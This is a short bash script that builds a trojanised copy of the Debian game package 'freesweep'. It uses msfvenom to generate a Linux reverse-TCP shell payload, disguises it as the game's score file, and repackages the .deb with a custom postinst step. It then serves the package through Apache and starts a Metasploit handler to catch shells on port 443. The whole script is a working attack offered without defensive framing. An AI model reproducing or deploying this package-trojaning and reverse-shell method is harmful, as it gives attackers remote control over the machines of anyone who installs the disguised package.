pwd=$(pwd)
rm -rf /tmp/evil
rm -rf /var/www/html/free*

apt-get --download-only install freesweep
mkdir /tmp/evil
mv /var/cache/apt/archives/freesweep_*.deb /tmp/evil
cd /tmp/evil/
dpkg -x freesweep_*.deb work
mkdir work/DEBIAN
cd work/DEBIAN/
cat $pwd/control >> control
cat $pwd/postinst >> postinst
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=$1 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
chmod 755 postinst
dpkg-deb --build /tmp/evil/work
cd ../..
mv work.deb freesweep.deb
cp freesweep.deb /var/www/html/
service apache2 start
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST $1; set LPORT 443; run; exit -y"
